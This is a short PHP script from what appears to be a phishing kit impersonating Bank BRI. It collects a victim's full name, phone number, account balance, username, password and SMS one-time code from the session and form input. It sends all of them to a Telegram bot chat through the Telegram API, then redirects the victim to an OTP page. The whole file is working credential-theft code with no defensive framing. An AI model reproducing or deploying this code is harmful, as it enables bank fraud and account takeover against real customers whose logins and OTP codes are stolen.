<?php
include "telegram.php";
session_start();

$sms = $_POST['sms'];

$_SESSION['sms'] = $sms;

$nama = $_SESSION['nama'];
$nomor = $_SESSION['nomor'];
$saldo = $_SESSION['saldo'];
$uname = $_SESSION['uname'];
$pass = $_SESSION['pass'];

$message = "
( Bank BRI | No HP | ".$nomor.")

- Nama Lengkap : ".$nama."
- No HP : ".$nomor."
- Saldo : ".$saldo."
- Username : ".$uname."
- Password : ".$pass."
- Code OTP : ".$sms."

 ";

function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../otp.php');
?>
